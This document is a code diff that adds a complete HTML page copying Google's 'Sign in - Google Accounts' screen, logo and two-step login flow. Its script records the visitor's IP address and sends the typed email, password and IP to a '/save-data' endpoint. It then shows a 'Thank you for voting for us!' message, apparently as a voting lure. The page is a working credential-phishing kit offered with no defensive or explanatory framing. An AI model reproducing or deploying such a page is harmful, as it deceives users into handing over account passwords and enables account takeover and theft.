@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body {
+            font-family: 'Roboto', 'Noto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .google-logo {
+            height: 24px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 8px;
+        }
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 32px;
+            color: #202124;
+        }
+        form {
+            width: 100%;
+        }
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        input[type="email"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #1a73e8;
+        }
+        label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #5f6368;
+            pointer-events: none;
+            transition: 0.2s ease all;
+            background-color: #fff;
+            padding: 0 4px;
+        }
+        input:focus + label, input:not(:placeholder-shown) + label {
+            top: 0;
+            font-size: 12px;
+        }
+        .forgot-email, .forgot-password {
+            display: inline-block;
+            margin-top: 8px;
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        button:hover {
+            background-color: #287ae6;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3),0 1px 3px 1px rgba(66,133,244,0.15);
+        }
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            padding: 16px 0;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer select {
+            background: none;
+            border: none;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 24px;
+        }
+        #password-section {
+            display: none;
+        }
+        #thank-you-message {
+            display: none;
+            font-size: 24px;
+            color: #1a73e8;
+            text-align: center;
+            animation: fadeInUp 0.5s ease-out;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .success-animation {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 5px solid #4CAF50;
+            border-top: 5px solid transparent;
+            animation: rotate 1s linear infinite, expand 0.5s ease-out;
+        }
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes expand {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+        <form id="login-form">
+            <div id="email-section">
+                <div class="form-group">
+                    <input type="email" id="email" required placeholder=" ">
+                    <label for="email">Email or phone</label>
+                </div>
+                <a href="#" class="forgot-email">Forgot email?</a>
+                <div class="button-container">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="button" onclick="showPasswordSection()">Next</button>
+                </div>
+            </div>
+            <div id="password-section">
+                <div class="form-group">
+                    <input type="password" id="password" required placeholder=" ">
+                    <label for="password">Enter your password</label>
+                </div>
+                <a href="#" class="forgot-password">Forgot password?</a>
+                <div class="button-container">
+                    <button type="button" onclick="showEmailSection()">Back</button>
+                    <button type="submit">Next</button>
+                </div>
+            </div>
+        </form>
+    </div>
+    <div id="thank-you-message" style="display:none;">
+        <div class="success-animation"></div>
+        <p>Thank you for voting for us!</p>
+        <p>Your IP Address is: <span id="ip-address"></span></p> <!-- Display IP here -->
+    </div>
+    <footer class="footer">
+        <select aria-label="Change language">
+            <option>English (United States)</option>
+        </select>
+        <div>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </footer>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+        let userIP = '';
+        
+        $.getJSON('https://api.ipify.org?format=json')
+            .done(function(data) {
+                userIP = data.ip;
+                console.log('User IP Address:', userIP);
+                document.getElementById('ip-address').textContent = userIP; 
+            })
+            .fail(function() {
+                console.error('Could not retrieve IP address.');
+            });
+
+        function showPasswordSection() {
+            document.getElementById('email-section').style.display = 'none';
+            document.getElementById('password-section').style.display = 'block';
+            document.querySelector('.subtitle').textContent = 'Welcome';
+            document.querySelector('h1').textContent = document.getElementById('email').value;
+        }
+
+        function showEmailSection() {
+            document.getElementById('email-section').style.display = 'block';
+            document.getElementById('password-section').style.display = 'none';
+            document.querySelector('.subtitle').textContent = 'Use your Google Account';
+            document.querySelector('h1').textContent = 'Sign in';
+        }
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const data = {
+                email: email,
+                password: password,
+                ip: userIP  
+            };
+
+            console.log('Saving data to data.json:', data);
+
+            fetch('/save-data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Success:', result);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+
+            document.querySelector('.login-container').style.display = 'none';
+            document.getElementById('thank-you-message').style.display = 'block';
+
+            setTimeout(() => {
+                document.getElementById('login-form').reset();
+                showEmailSection();
+                document.querySelector('.login-container').style.display = 'flex';
+                document.getElementById('thank-you-message').style.display = 'none';
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
